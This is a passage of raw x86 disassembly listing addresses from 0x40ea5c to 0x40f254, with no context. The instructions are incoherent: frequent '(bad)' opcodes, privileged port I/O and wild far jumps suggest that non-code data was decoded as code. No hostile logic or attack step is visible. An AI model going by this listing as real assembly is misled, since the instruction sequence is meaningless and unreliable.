  40ea5c:	loop   0x40ea27
  40ea5e:	mov    cl,0xec
  40ea60:	enter  0xfad1,0xdf
  40ea64:	mov    esi,0xc8c3bff5
  40ea69:	repnz loopne 0x40ea61
  40ea6c:	cmc    
  40ea6d:	fild   DWORD PTR ds:0xfcbdbe1
  40ea73:	add    al,BYTE PTR [edi]
  40ea75:	enter  0xadd3,0xc9
  40ea79:	into   
  40ea7a:	int    0xb5
  40ea7c:	shl    esi,0xf4
  40ea7f:	repz aad 0xb9
  40ea82:	repnz mov esi,0xdff4dbbd
  40ea88:	add    edi,esi
  40ea8a:	(bad)  
  40ea8b:	hlt    
  40ea8c:	loope  0x40ea90
  40ea8e:	fdivr  st(5),st
  40ea90:	ret    0xd60b
  40ea93:	fucomip st,st(7)
  40ea95:	shr    ebx,cl
  40ea97:	mov    esi,0xb2c7b3cc
  40ea9c:	out    0xeb,al
  40ea9e:	(bad)  
  40eaa1:	not    ch
  40eaa3:	mov    eax,0xda01faea
  40eaa8:	(bad)  
  40eaa9:	in     eax,dx
  40eaaa:	cli    
  40eaab:	repnz (bad) 
  40eaad:	(bad)  
  40eaae:	(bad)  
  40eaaf:	fcmovnu st,st(0)
  40eab1:	iret   
  40eab2:	jmp    0x40eaa0
  40eab4:	std    
  40eab5:	fsubr  st,st(4)
  40eab7:	mov    bl,0xb3
  40eab9:	mov    esi,0xedeec2e3
  40eabe:	(bad)  
  40eabf:	mul    dh
  40eac1:	fdiv   st,st(0)
  40eac3:	iret   
  40eac4:	fsubr  st,st(4)
  40eac6:	add    esp,eax
  40eac8:	sar    DWORD PTR [ebx+esi*8-0x1d340208],cl
  40eacf:	retf   
  40ead0:	jmp    0x40eab1
  40ead2:	call   0xd023c7e4
  40ead7:	into   
  40ead8:	mov    eax,0xc3c9d0d6
  40eadd:	sti    
  40eade:	shl    ebx,1
  40eae0:	xlat   BYTE PTR ds:[ebx]
  40eae1:	rcl    ch,1
  40eae3:	in     eax,0xbc
  40eae5:	fcmovu st,st(6)
  40eae7:	add    dl,ah
  40eae9:	clc    
  40eaea:	fcomip st,st(7)
  40eaec:	fsub   st(3),st
  40eaee:	fucom  st(5)
  40eaf0:	jmp    0xce00:0xe7c60a02
  40eaf7:	mov    ecx,0xf2ebdce4
  40eafc:	mov    cl,0xe8
  40eafe:	into   
  40eaff:	lock call ecx
  40eb02:	in     al,0xc8
  40eb04:	xlat   BYTE PTR ds:[ebx]
  40eb05:	dec    eax
  40eb07:	call   0x242a8e0
  40eb0c:	add    al,0xbd
  40eb0e:	shl    edx,1
  40eb10:	(bad)  
  40eb11:	leave  
  40eb12:	(bad)  
  40eb13:	cli    
  40eb14:	adc    ecx,DWORD PTR [eax]
  40eb16:	or     eax,0xced6cae9
  40eb1b:	iret   
  40eb1c:	aam    0xd1
  40eb1e:	mov    ch,0xcd
  40eb20:	cmc    
  40eb21:	(bad)  
  40eb22:	fstp   st(0)
  40eb24:	mov    dh,0xb1
  40eb26:	idiv   bl
  40eb28:	rcl    ecx,1
  40eb2a:	ret    
  40eb2b:	fprem1 
  40eb2d:	fcom   st(0)
  40eb2f:	(bad)  
  40eb31:	(bad)
  40eb34:	jecxz  0x40eafb
  40eb36:	std    
  40eb37:	(bad)
  40eb3a:	repz aad 0xf3
  40eb3d:	ror    ebp,1
  40eb3f:	aad    0xce
  40eb41:	retf   
  40eb42:	in     eax,dx
  40eb43:	cld    
  40eb44:	mov    dh,0xfd
  40eb46:	add    bl,ah
  40eb48:	std    
  40eb49:	sti    
  40eb4a:	cmc    
  40eb4b:	(bad)  
  40eb4d:	cmc    
  40eb4e:	(bad)  
  40eb4f:	leave  
  40eb50:	fprem1 
  40eb52:	clc    
  40eb53:	fsubr  st(5),st
  40eb55:	leave  
  40eb56:	or     ebp,ecx
  40eb58:	fstp   st(4)
  40eb5a:	iret   
  40eb5b:	(bad)  
  40eb5c:	in     eax,dx
  40eb5d:	mov    cl,0xd1
  40eb5f:	retf   0xb7d3
  40eb62:	retf   
  40eb63:	mov    ebx,0xc3b0f3f1
  40eb68:	fucom  st(3)
  40eb6a:	cmc    
  40eb6b:	push   es
  40eb6c:	pop    es
  40eb6d:	repz rcr dl,1
  40eb70:	bswap  ebx
  40eb72:	push   cs
  40eb73:	(bad)  
  40eb74:	out    dx,eax
  40eb75:	adc    al,BYTE PTR ds:0xc7c3eec5
  40eb7b:	int    0xf3
  40eb7d:	loop   0x40eb40
  40eb7f:	fcmove st,st(1)
  40eb81:	mov    ecx,0xc9f7fdf5
  40eb86:	loop   0x40eb63
  40eb88:	stc    
  40eb89:	ret    0xecfa
  40eb8c:	mov    edx,0x2e5e3ea
  40eb91:	sti    
  40eb92:	or     DWORD PTR ds:0xaec4cb03,ecx
  40eb98:	jmp    0xd122a864
  40eb9d:	call   0xb70ab489
  40eba2:	leave  
  40eba3:	mov    ebp,0xdbdaeab5
  40eba8:	out    dx,eax
  40eba9:	shl    DWORD PTR [eax+edi*8+0x7dfd601],0x7
  40ebb1:	sar    edi,0x9
  40ebb4:	fsub   st,st(0)
  40ebb6:	in     al,dx
  40ebb7:	rol    esp,1
  40ebb9:	repnz xlat BYTE PTR ds:[ebx]
  40ebbb:	loope  0x40eb69
  40ebbd:	out    dx,eax
  40ebbe:	in     al,dx
  40ebbf:	icebp  
  40ebc0:	hlt    
  40ebc1:	jmp    0xccf3:0xd3bacbb8
  40ebc8:	mov    edi,0xd9cdeebd
  40ebcd:	add    eax,DWORD PTR [edx]
  40ebcf:	sar    dh,1
  40ebd1:	out    0xc6,al
  40ebd3:	or     eax,DWORD PTR [eax]
  40ebd5:	std    
  40ebd6:	ror    bl,cl
  40ebd8:	jmp    0xe8c1:0xacf7eaed
  40ebdf:	in     eax,dx
  40ebe0:	clc    
  40ebe1:	cli    
  40ebe2:	inc    esp
  40ebe4:	call   0xfb2dc3e5
  40ebe9:	clc    
  40ebea:	in     al,dx
  40ebeb:	stc    
  40ebec:	cld    
  40ebed:	(bad)
  40ebf0:	hlt    
  40ebf1:	(bad)  
  40ebf2:	enter  0xcce3,0xf2
  40ebf6:	jmp    0xe72699ca
  40ebfb:	les    esi,FWORD PTR [esi-0x20300e4f]
  40ec01:	call   0xde30eaf2
  40ec06:	mov    esi,0xd4d8b8bb
  40ec0b:	in     eax,0xc6
  40ec0d:	ret    
  40ec0e:	fcomp  st(1)
  40ec10:	lock jmp 0xfe10dbf2
  40ec16:	iret   
  40ec17:	mov    dl,0xe1
  40ec19:	in     al,dx
  40ec1a:	lods   eax,DWORD PTR ds:[esi]
  40ec1b:	mov    ebp,0xf9d5fbf6
  40ec20:	out    dx,eax
  40ec21:	int3   
  40ec22:	inc    esp
  40ec24:	jmp    0xdce2:0xfeecdfce
  40ec2b:	(bad)  
  40ec2c:	rcl    dh,cl
  40ec2e:	aam    0xfa
  40ec30:	std    
  40ec31:	jmp    0xabda:0x5ceeeeb
  40ec38:	ret    0xe1dc
  40ec3b:	lock jmp 0xd72bd90b
  40ec41:	rcr    cl,cl
  40ec43:	sti    
  40ec44:	jecxz  0x40ec44
  40ec46:	cmc    
  40ec47:	mov    esi,0x7fbd4f3
  40ec4c:	stc    
  40ec4d:	rol    al,0xe5
  40ec50:	out    0xd8,al
  40ec52:	(bad)
  40ec55:	(bad)
  40ec58:	mov    bl,0xa5
  40ec5a:	(bad)
  40ec5d:	xlat   BYTE PTR ds:[ebx]
  40ec5e:	out    0xf0,al
  40ec60:	repnz retf 0xd8ee
  40ec64:	cld    
  40ec65:	ret    
  40ec66:	cli    
  40ec67:	rol    al,cl
  40ec69:	(bad)  
  40ec6a:	pop    es
  40ec6b:	inc    BYTE PTR [ebx]
  40ec6d:	(bad)  
  40ec6f:	(bad)  
  40ec71:	retf   0xeffb
  40ec74:	(bad)  
  40ec76:	loop   0x40ec6a
  40ec78:	mov    bl,0xc7
  40ec7a:	retf   0xeeb2
  40ec7d:	ret    0xf5ee
  40ec80:	jmp    0xfd32c171
  40ec85:	out    dx,al
  40ec86:	(bad)  
  40ec87:	out    dx,al
  40ec88:	loope  0x40ec62
  40ec8a:	rcl    ch,0xd8
  40ec8d:	neg    edx
  40ec8f:	push   es
  40ec90:	loopne 0x40ec92
  40ec92:	cld    
  40ec93:	(bad)  
  40ec94:	iret   
  40ec95:	jmp    0xd711d766
  40ec9a:	shl    dh,0xf0
  40ec9d:	repz retf 
  40ec9f:	stc    
  40eca0:	sti    
  40eca1:	(bad)  
  40eca2:	retf   0xd2ea
  40eca5:	jmp    0xded5:0xcfbac1db
  40ecac:	fdivr  st,st(1)
  40ecae:	mov    edi,0xdbddc0df
  40ecb4:	(bad)  
  40ecb6:	in     eax,dx
  40ecb7:	retf   
  40ecb8:	mov    al,0xe6
  40ecba:	in     eax,dx
  40ecbb:	jecxz  0x40ec88
  40ecbd:	lock jmp 0xba06c687
  40ecc3:	aad    0xdb
  40ecc5:	(bad)  
  40ecc7:	add    esp,ecx
  40ecc9:	fcmovnb st,st(2)
  40eccb:	(bad)  
  40eccc:	shl    dh,1
  40ecce:	mov    esp,0xe70ddcc0
  40ecd4:	jmp    ebx
  40ecd6:	out    dx,eax
  40ecd7:	fsub   st,st(5)
  40ecd9:	enter  0xc2d3,0xc4
  40ecdd:	out    0xc9,eax
  40ecdf:	mov    ch,0xb8
  40ece1:	repnz retf 0xdebd
  40ece5:	enter  0xbcbc,0xff
  40ece9:	iret   
  40ecea:	shl    esi,cl
  40ecec:	cli    
  40eced:	(bad)  
  40ecef:	call   0xd02eb5b8
  40ecf4:	into   
  40ecf5:	(bad)  
  40ecf7:	out    dx,al
  40ecf8:	jecxz  0x40ece6
  40ecfa:	cmc    
  40ecfb:	int    0xcc
  40ecfd:	mov    ebx,0xf1cfd4ba
  40ed02:	shl    esp,1
  40ed04:	leave  
  40ed05:	cli    
  40ed06:	stc    
  40ed07:	mov    esi,0xd3e7f8e2
  40ed0c:	fcomp  st(6)
  40ed0e:	add    al,0xc5
  40ed10:	(bad)  
  40ed11:	(bad)  
  40ed12:	out    0x1,eax
  40ed14:	fdiv   st,st(3)
  40ed16:	add    eax,0xc0cdb0aa
  40ed1b:	test   esp,0xb6dbcef0
  40ed21:	fnstenv [ecx+ebx*8-0x32fd4a36]
  40ed28:	aad    0xbf
  40ed2a:	(bad)  
  40ed2b:	(bad)  
  40ed2c:	std    
  40ed2d:	fcmovbe st,st(5)
  40ed2f:	in     eax,0xdf
  40ed31:	(bad)  
  40ed32:	jmp    0x40ed1e
  40ed34:	clc    
  40ed35:	jmp    0xb320ccfa
  40ed3a:	mov    ebp,0xf2e6dbca
  40ed3f:	into   
  40ed40:	sar    al,1
  40ed42:	int    0xf8
  40ed44:	mov    ebx,0x2bef4d9
  40ed49:	loopne 0x40ed2c
  40ed4b:	rcl    ch,1
  40ed4d:	retf   
  40ed4e:	stc    
  40ed4f:	hlt    
  40ed50:	in     eax,0xc5
  40ed52:	fld    st(3)
  40ed54:	add    bl,cl
  40ed56:	fld    st(7)
  40ed58:	in     eax,dx
  40ed59:	repz ror ebp,0xc5
  40ed5d:	idiv   DWORD PTR [edx-0x2f2a4a08]
  40ed63:	fdiv   st,st(1)
  40ed65:	fcmovne st,st(6)
  40ed67:	fmul   st,st(4)
  40ed69:	aad    0x5
  40ed6b:	add    dh,al
  40ed6d:	ret    
  40ed6e:	(bad)  
  40ed70:	lock fsubrp st(2),st
  40ed73:	cld    
  40ed74:	out    0xc8,eax
  40ed76:	jmp    0x40ed3c
  40ed78:	loop   0x40ed69
  40ed7a:	(bad)  
  40ed7b:	scas   eax,DWORD PTR es:[edi]
  40ed7c:	ret    0xd6a9
  40ed7f:	fsincos 
  40ed81:	cmc    
  40ed82:	(bad)  
  40ed83:	mov    edx,0xe0ddeefc
  40ed88:	aam    0xd9
  40ed8a:	clc    
  40ed8b:	clc    
  40ed8c:	in     al,0xe4
  40ed8e:	(bad)  
  40ed90:	(bad)  
  40ed91:	(bad)  
  40ed92:	add    al,0x4
  40ed94:	add    bl,al
  40ed96:	out    0xc0,eax
  40ed98:	test   al,0xbe
  40ed9a:	repnz fsubr st(5),st
  40ed9d:	mov    cl,0xc0
  40ed9f:	(bad)
  40eda2:	in     al,0xcd
  40eda4:	mov    edx,0xd1fa01e3
  40eda9:	fsub   st,st(5)
  40edab:	mov    edi,0x3ded6c4
  40edb0:	stc    
  40edb1:	add    bl,al
  40edb3:	pop    es
  40edb4:	(bad)  
  40edb5:	shl    ebx,cl
  40edb7:	retf   
  40edb8:	icebp  
  40edb9:	mov    cl,0xf7
  40edbb:	scas   eax,DWORD PTR es:[edi]
  40edbc:	enter  0xc5f1,0xe1
  40edc0:	jmp    0xfbee:0xdfe8bbf1
  40edc7:	(bad)  
  40edc9:	fdivp  st(5),st
  40edcb:	test   ebx,0xe0fcf7f6
  40edd1:	(bad)  
  40edd3:	or     al,0x1
  40edd5:	loopne 0x40eda0
  40edd7:	int    0xea
  40edd9:	out    0xb7,eax
  40eddb:	leave  
  40eddc:	lods   eax,DWORD PTR ds:[esi]
  40eddd:	rcl    eax,0xcc
  40ede0:	fucomi st,st(2)
  40ede2:	int3   
  40ede3:	clc    
  40ede4:	(bad)  
  40ede6:	retf   0xf9c8
  40ede9:	rcr    cl,cl
  40edeb:	cli    
  40edec:	out    0xc5,eax
  40edee:	sar    BYTE PTR [edi-0x3a2619f6],cl
  40edf4:	loop   0x40ede0
  40edf6:	loop   0x40edc5
  40edf8:	test   al,0xf7
  40edfa:	ret    0xecec
  40edfd:	out    0xc1,eax
  40edff:	mov    bh,0xd0
  40ee01:	sar    esi,1
  40ee03:	fcomi  st,st(1)
  40ee05:	hlt    
  40ee06:	neg    ebp
  40ee08:	in     eax,dx
  40ee09:	mov    esi,0xdc0bc5cd
  40ee0e:	jmp    0x40ee19
  40ee10:	jmp    0x40edee
  40ee12:	in     al,0xf9
  40ee14:	clc    
  40ee15:	int    0xf8
  40ee17:	repnz jmp 0xe4d0:0xd6d1b0ec
  40ee1f:	mov    edx,0xb9cdcdd9
  40ee24:	jmp    0xf011cbf8
  40ee29:	cld    
  40ee2a:	int    0x6
  40ee2c:	repnz in eax,0xdf
  40ee2f:	push   esp
  40ee31:	test   dh,0x0
  40ee34:	add    eax,0xacbec9d8
  40ee39:	mov    esp,0xfae5cedd
  40ee3e:	loope  0x40ee34
  40ee40:	scas   al,BYTE PTR es:[edi]
  40ee41:	(bad)  
  40ee44:	jmp    0x40ee23
  40ee46:	jmp    0x601:0xc0e7e3b7
  40ee4d:	sti    
  40ee4e:	aad    0xc3
  40ee50:	out    0xf9,eax
  40ee52:	std    
  40ee53:	out    0xc4,eax
  40ee55:	or     DWORD PTR [edx],ecx
  40ee57:	jecxz  0x40ee27
  40ee59:	repnz shl BYTE PTR [ecx-0x464e5317],0xd0
  40ee61:	out    dx,eax
  40ee62:	int3   
  40ee63:	cld    
  40ee64:	jecxz  0x40ee48
  40ee66:	(bad)  
  40ee68:	rcr    ebp,0xdc
  40ee6b:	cmc    
  40ee6c:	mov    esi,0xf7f6ebd3
  40ee71:	leave  
  40ee72:	jmp    0x40ee58
  40ee74:	repz adc bh,ch
  40ee77:	shl    DWORD PTR [eax-0x4e171134],cl
  40ee7d:	lock icebp 
  40ee7f:	(bad)  
  40ee81:	in     al,dx
  40ee82:	mov    bh,0xf8
  40ee84:	sar    DWORD PTR [ebp+edx*8-0x1d1f2200],cl
  40ee8b:	std    
  40ee8c:	(bad)  
  40ee8d:	jmp    0xf0a:0xd4d0d9d5
  40ee94:	add    ebp,ebx
  40ee96:	cld    
  40ee97:	(bad)  
  40ee99:	loopne 0x40ee8b
  40ee9b:	xlat   BYTE PTR ds:[ebx]
  40ee9c:	mov    esp,0xbac8e0d5
  40eea1:	enter  0xf3e5,0xd5
  40eea5:	jmp    0xd9f9ce68
  40eeaa:	push   es
  40eeab:	in     eax,0xf1
  40eead:	mov    BYTE PTR [edx+ebx*8],0xdd
  40eeb1:	shl    esi,0x8
  40eeb4:	jmp    0xc6ce:0xd0bfe312
  40eebb:	out    dx,eax
  40eebc:	lock in eax,dx
  40eebe:	enter  0xe0e5,0xb9
  40eec2:	mov    edx,0xfcdcdeb9
  40eec7:	fcmovbe st,st(2)
  40eec9:	repnz sti 
  40eecb:	int    0x0
  40eecd:	(bad)  
  40eece:	jmp    ecx
  40eed0:	lock idiv bh
  40eed3:	add    ebx,edi
  40eed5:	(bad)  
  40eed7:	scas   al,BYTE PTR es:[edi]
  40eed8:	mov    bl,0xac
  40eeda:	mov    dl,0xe0
  40eedc:	icebp  
  40eedd:	aad    0xfb
  40eedf:	clc    
  40eee0:	rol    edi,cl
  40eee2:	int3   
  40eee3:	xlat   BYTE PTR ds:[ebx]
  40eee4:	(bad)  
  40eee5:	lock into 
  40eee7:	sar    ah,cl
  40eee9:	cli    
  40eeea:	sti    
  40eeeb:	std    
  40eeec:	mov    edx,0xfe607d0
  40eef1:	or     ch,cl
  40eef3:	hlt    
  40eef4:	jecxz  0x40eec5
  40eef6:	loope  0x40eec1
  40eef8:	idiv   DWORD PTR [edx+eax*8-0x324e1210]
  40eeff:	mov    ebx,0xcaf2f8ca
  40ef04:	in     al,0xb9
  40ef06:	mov    esp,0xd2e1f7cc
  40ef0b:	icebp  
  40ef0c:	ret    
  40ef0d:	push   es
  40ef0e:	(bad)
  40ef11:	or     edi,edi
  40ef13:	into   
  40ef14:	loopne 0x40ef12
  40ef16:	adc    esp,ebp
  40ef18:	jmp    0xe118d6f0
  40ef1d:	rol    al,cl
  40ef1f:	sti    
  40ef20:	mov    edx,0xeeb8b5c5
  40ef25:	rcl    edx,1
  40ef27:	fsubr  st,st(7)
  40ef29:	mov    ch,0xd5
  40ef2b:	fsubr  st(7),st
  40ef2d:	fcomp  st(2)
  40ef2f:	jmp    0x40ef14
  40ef31:	fcmove st,st(1)
  40ef33:	or     al,0xe9
  40ef35:	push   cs
  40ef36:	out    0xdc,eax
  40ef38:	in     al,dx
  40ef39:	(bad)  
  40ef3b:	fnsave [eax-0x82a090b]
  40ef41:	clc    
  40ef42:	std    
  40ef43:	(bad)
  40ef46:	std    
  40ef47:	fild   WORD PTR [edx]
  40ef49:	int3   
  40ef4a:	loope  0x40ef39
  40ef4c:	std    
  40ef4d:	repnz rcl ch,0xf0
  40ef51:	loop   0x40ef28
  40ef53:	pop    es
  40ef54:	leave  
  40ef55:	in     al,dx
  40ef56:	enter  0xbda7,0xc6
  40ef5a:	retf   
  40ef5b:	scas   eax,DWORD PTR es:[edi]
  40ef5c:	mov    bl,0xf7
  40ef5e:	test   al,0xcf
  40ef60:	retf   0xcbd3
  40ef63:	cli    
  40ef64:	add    ebx,esp
  40ef66:	mov    edx,0xf6ecb8fa
  40ef6b:	int    0x4
  40ef6d:	cmc    
  40ef6e:	retf   0x1e3
  40ef71:	cmc    
  40ef72:	call   0xe82bd63d
  40ef77:	out    0xf2,al
  40ef79:	jecxz  0x40ef4e
  40ef7b:	loop   0x40ef4e
  40ef7d:	sti    
  40ef7e:	(bad)  
  40ef80:	scas   al,BYTE PTR es:[edi]
  40ef81:	shl    ch,cl
  40ef83:	icebp  
  40ef84:	in     eax,dx
  40ef85:	jmp    0xf615d35a
  40ef8a:	mov    ebp,0xfec2f4d0
  40ef8f:	ret    0xcfff
  40ef92:	std    
  40ef93:	fucomp st(6)
  40ef95:	or     eax,0xe6bfd1ee
  40ef9a:	mov    bh,0xd0
  40ef9c:	lock into 
  40ef9e:	xlat   BYTE PTR ds:[ebx]
  40ef9f:	clc    
  40efa0:	hlt    
  40efa1:	out    dx,eax
  40efa2:	std    
  40efa3:	fdivr  QWORD PTR [ecx-0x414322fd]
  40efa9:	(bad)  
  40efab:	add    edi,ebx
  40efad:	in     eax,0xd5
  40efaf:	(bad)
  40efb2:	clc    
  40efb3:	stc    
  40efb4:	iret   
  40efb5:	fucomi st,st(7)
  40efb7:	mov    esi,0xc3edcaac
  40efbc:	jmp    0xf0da:0xb1f8dbb4
  40efc3:	jmp    0xf732ea96
  40efc8:	in     eax,dx
  40efc9:	neg    bh
  40efcb:	rol    BYTE PTR [edi+eiz*8],1
  40efce:	hlt    
  40efcf:	or     esp,eax
  40efd1:	(bad)  
  40efd2:	add    eax,0xcbcdfddc
  40efd7:	ret    0xf3e9
  40efda:	lods   eax,DWORD PTR ds:[esi]
  40efdb:	repnz lods eax,DWORD PTR ds:[esi]
  40efdd:	repz ror ecx,0xce
  40efe1:	xlat   BYTE PTR ds:[ebx]
  40efe2:	mov    ch,0xe5
  40efe4:	into   
  40efe5:	mov    cl,0xd0
  40efe7:	fcomip st,st(0)
  40efe9:	icebp  
  40efea:	out    0xbd,al
  40efec:	rcl    ah,1
  40efee:	loope  0x40efd4
  40eff0:	add    edx,ebp
  40eff2:	pop    es
  40eff3:	stc    
  40eff4:	leave  
  40eff5:	les    ecx,FWORD PTR [ebx]
  40eff7:	mov    cl,0xb1
  40eff9:	call   0xb123b8ce
  40effe:	out    0xc4,al
  40f000:	fsubr  st,st(3)
  40f002:	retf   
  40f003:	mov    ebx,0xc1bcbcfd
  40f008:	fmul   st,st(7)
  40f00a:	out    0xc5,al
  40f00c:	icebp  
  40f00d:	(bad)  
  40f00e:	fadd   DWORD PTR [esi]
  40f010:	lar    ebx,sp
  40f013:	add    ecx,DWORD PTR [esi]
  40f015:	rcl    DWORD PTR [edx],cl
  40f017:	fdivrp st(1),st
  40f019:	(bad)  
  40f01a:	iret   
  40f01b:	icebp  
  40f01c:	jmp    0x40eff2
  40f01e:	shl    ecx,cl
  40f020:	jmp    0xdf02:0xcbb5f0d9
  40f027:	add    DWORD PTR [edx-0x1a3c0627],edi
  40f02d:	or     bl,ah
  40f02f:	leave  
  40f030:	enter  0xe6f4,0xe1
  40f034:	sti    
  40f035:	or     DWORD PTR [esi],ecx
  40f037:	lock xlat BYTE PTR ds:[ebx]
  40f039:	shl    al,0xf4
  40f03c:	lods   al,BYTE PTR ds:[esi]
  40f03d:	icebp  
  40f03e:	ret    0xf6ed
  40f041:	mov    cl,0xcf
  40f043:	mov    dh,0xb9
  40f045:	jmp    0xd541a825
  40f04a:	fiadd  DWORD PTR [ebx]
  40f04c:	or     eax,DWORD PTR [eax]
  40f04e:	add    al,0xf4
  40f050:	add    eax,edi
  40f052:	leave  
  40f053:	mov    BYTE PTR [ecx],0xdb
  40f056:	add    ebp,edx
  40f058:	scas   eax,DWORD PTR es:[edi]
  40f059:	out    dx,al
  40f05a:	mov    esi,0xe7c2e2e7
  40f05f:	mov    dl,0xe5
  40f061:	(bad)  
  40f063:	retf   0xf1f7
  40f066:	mov    esp,0xcc02e7f0
  40f06b:	hlt    
  40f06c:	fiadd  DWORD PTR [edi]
  40f06e:	cli    
  40f06f:	std    
  40f070:	or     esi,edi
  40f072:	stc    
  40f073:	(bad)  
  40f074:	fiadd  WORD PTR [edi]
  40f076:	or     ebp,ecx
  40f078:	in     eax,dx
  40f079:	xlat   BYTE PTR ds:[ebx]
  40f07a:	jmp    0xb525b941
  40f07f:	scas   eax,DWORD PTR es:[edi]
  40f080:	retf   
  40f081:	mov    ebx,0xf5f1edf4
  40f086:	mov    esp,0x6f7c0fc
  40f08b:	(bad)  
  40f08d:	stc    
  40f08e:	aad    0x0
  40f090:	clc    
  40f091:	fcomip st,st(4)
  40f093:	jmp    0xc2c0:0xc9e302de
  40f09a:	out    0xeb,eax
  40f09c:	mov    cl,0xad
  40f09e:	mov    bh,0xce
  40f0a0:	fdiv   DWORD PTR [ebp-0x111a1c]
  40f0a6:	aam    0xf5
  40f0a8:	add    al,BYTE PTR [edi]
  40f0aa:	pop    es
  40f0ab:	sar    eax,1
  40f0ad:	repnz rcr ecx,0xca
  40f0b1:	fmul   st(6),st
  40f0b3:	(bad)  
  40f0b5:	add    ebp,ebx
  40f0b7:	int    0xdc
  40f0b9:	imul   DWORD PTR [esi+edx*8-0xd0f384e]
  40f0c0:	cmc    
  40f0c1:	out    dx,al
  40f0c2:	into   
  40f0c3:	idiv   DWORD PTR [ebp-0x52c0e03]
  40f0c9:	in     eax,dx
  40f0ca:	aam    0xe6
  40f0cc:	sti    
  40f0cd:	shl    eax,0xf0
  40f0d0:	std    
  40f0d1:	fadd   QWORD PTR [ebx]
  40f0d3:	push   cs
  40f0d4:	clc    
  40f0d5:	(bad)  
  40f0d7:	iret   
  40f0d8:	mov    edi,0xd4edecd7
  40f0dd:	mov    ah,0xdb
  40f0df:	mov    ebx,0xbec5e8f3
  40f0e4:	lock (bad) 
  40f0e7:	dec    eax
  40f0e9:	add    edi,edi
  40f0eb:	test   BYTE PTR [edx],0xb9
  40f0ee:	cmc    
  40f0ef:	fucomi st,st(2)
  40f0f1:	std    
  40f0f2:	stc    
  40f0f3:	cli    
  40f0f4:	vpsllw xmm0,xmm2,xmm3
  40f0f8:	iret   
  40f0f9:	call   0xeb13daf4
  40f0fe:	in     eax,dx
  40f0ff:	retf   0xeec6
  40f102:	out    0xc9,al
  40f104:	in     al,0xde
  40f106:	fcomip st,st(0)
  40f108:	call   0xdd04c1e2
  40f10d:	cli    
  40f10e:	jmp    0x40f112
  40f110:	add    DWORD PTR [ebx],ecx
  40f112:	cld    
  40f113:	out    dx,al
  40f114:	in     eax,0x9
  40f116:	or     eax,0xa8a5d8b2
  40f11b:	out    dx,eax
  40f11c:	retf   0xcdd2
  40f11f:	test   edi,0xf8d9d0b5
  40f125:	mov    ebx,0xc3e2ddc3
  40f12a:	call   esi
  40f12c:	jecxz  0x40f0ff
  40f12e:	mov    eax,0xcbdbfbfc
  40f133:	clc    
  40f134:	out    dx,eax
  40f135:	out    0xa,al
  40f137:	stos   BYTE PTR es:[edi],al
  40f138:	ret    
  40f139:	fidivr WORD PTR [ebp-0x2a3f3037]
  40f13f:	iret   
  40f140:	(bad)  
  40f141:	fcmove st,st(1)
  40f143:	(bad)  
  40f144:	jmp    0x3d6:0xd1ccfad1
  40f14b:	push   es
  40f14c:	or     esp,esi
  40f14e:	aad    0xdc
  40f150:	cmc    
  40f151:	jmp    0xca0ed32e
  40f156:	out    0xe6,al
  40f158:	mov    eax,0xe7d5eae3
  40f15d:	aad    0xd2
  40f15f:	(bad)  
  40f160:	repz in al,dx
  40f162:	out    dx,al
  40f163:	lock mov edi,0xf6f1bebd
  40f169:	pop    es
  40f16a:	jecxz  0x40f15f
  40f16c:	mov    edx,0xfd1f905
  40f171:	fmul   st,st(6)
  40f173:	hlt    
  40f174:	fild   WORD PTR [ecx]
  40f176:	rol    al,cl
  40f178:	lods   al,BYTE PTR ds:[esi]
  40f179:	(bad)
  40f17c:	out    dx,al
  40f17d:	aam    0xc9
  40f17f:	mov    ecx,0xeed5cfd7
  40f184:	mov    ebx,0xcedac3ed
  40f189:	div    ebx
  40f18b:	loop   0x40f186
  40f18d:	add    bh,al
  40f18f:	in     al,0xf9
  40f191:	mov    ebp,0xd3ccfacf
  40f196:	loop   0x40f174
  40f198:	test   al,0xac
  40f19a:	int3   
  40f19b:	(bad)  
  40f19c:	shl    esp,cl
  40f19e:	icebp  
  40f19f:	jmp    0x40f16d
  40f1a1:	rol    esi,cl
  40f1a3:	mov    ebp,0xdecfecf3
  40f1a8:	int    0xd5
  40f1aa:	mov    eax,0xe3e4bccd
  40f1af:	retf   
  40f1b0:	lock add al,BYTE PTR ds:0xfadbf4e1
  40f1b7:	repnz into 
  40f1b9:	(bad)  
  40f1ba:	scas   al,BYTE PTR es:[edi]
  40f1bb:	scas   eax,DWORD PTR es:[edi]
  40f1bc:	out    0xa9,al
  40f1be:	in     eax,dx
  40f1bf:	fcmovbe st,st(4)
  40f1c1:	neg    al
  40f1c3:	sti    
  40f1c4:	rol    DWORD PTR [edx],cl
  40f1c6:	cli    
  40f1c7:	fistp  QWORD PTR [esi-0x3e081328]
  40f1cd:	std    
  40f1ce:	stc    
  40f1cf:	idiv   ebx
  40f1d1:	or     ebx,esp
  40f1d3:	dec    BYTE PTR [edx]
  40f1d5:	adc    edx,DWORD PTR [ecx]
  40f1d7:	loope  0x40f17f
  40f1d9:	ffree  st(1)
  40f1db:	retf   0xcbc9
  40f1de:	icebp  
  40f1df:	into   
  40f1e0:	iret   
  40f1e1:	fmulp  st(7),st
  40f1e3:	idiv   dh
  40f1e5:	shr    edi,1
  40f1e7:	xlat   BYTE PTR ds:[ebx]
  40f1e8:	clc    
  40f1e9:	add    eax,DWORD PTR [edi]
  40f1eb:	add    edx,esi
  40f1ed:	fld    st(0)
  40f1ef:	clc    
  40f1f0:	(bad)  
  40f1f2:	pop    es
  40f1f3:	inc    DWORD PTR [ecx*1-0x53281026]
  40f1fa:	icebp  
  40f1fb:	loope  0x40f1f0
  40f1fd:	hlt    
  40f1fe:	not    ah
  40f200:	(bad)
  40f203:	repnz mov edx,0xb8bde9f9
  40f209:	loop   0x40f1ce
  40f20b:	(bad)  
  40f20d:	call   ebp
  40f20f:	mov    edi,0xcf02dbf5
  40f214:	sti    
  40f215:	in     eax,0xda
  40f217:	loopne 0x40f20b
  40f219:	retf   0xcdea
  40f21c:	int3   
  40f21d:	in     eax,dx
  40f21e:	(bad)  
  40f220:	out    dx,eax
  40f221:	mov    eax,0xd1e3ddf4
  40f226:	fcmove st,st(1)
  40f228:	mov    esp,0xecd0ee01
  40f22d:	add    edi,edi
  40f22f:	hlt    
  40f230:	or     eax,edi
  40f232:	add    DWORD PTR [edi+eax*1],eax
  40f235:	add    dh,bl
  40f237:	loope  0x40f21b
  40f239:	in     eax,0xf5
  40f23b:	aam    0xd7
  40f23d:	retf   0xbbcd
  40f240:	(bad)  
  40f241:	int    0xe4
  40f243:	mov    ebp,0xfbbbd9d8
  40f248:	stc    
  40f249:	fcmovnb st,st(1)
  40f24b:	mov    eax,0xc8d8e90b
  40f251:	aam    0xca
  40f253:	leave  
  40f254:	retf   
